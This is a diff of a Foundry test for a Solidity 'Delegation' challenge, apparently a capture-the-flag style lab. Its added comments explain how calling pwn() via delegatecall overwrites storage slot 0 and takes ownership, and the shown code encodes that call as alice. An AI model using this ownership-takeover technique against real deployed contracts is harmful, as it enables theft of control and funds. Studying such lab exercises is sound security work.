@@ -4,10 +4,11 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import "../src/Delegation.sol";
 
+// call pwn() on Delegate for it updates the storage on the first slot of Delegation
+// thus updating Delegation's owner when delegatecall is called
 contract DelegationTest is Test {
     Delegate delegate;
     Delegation delegation;
-    address alice = makeAddr("alice");
 
     function setUp() public {
         delegate = new Delegate(address(this));
@@ -18,6 +19,7 @@ contract DelegationTest is Test {
         assertEq(delegate.owner(), address(this));
         assertEq(delegation.owner(), address(this));
 
+        address alice = makeAddr("alice");
         vm.startPrank(alice);
         bytes memory data = abi.encodeWithSignature("pwn()");
         console.logBytes(data);
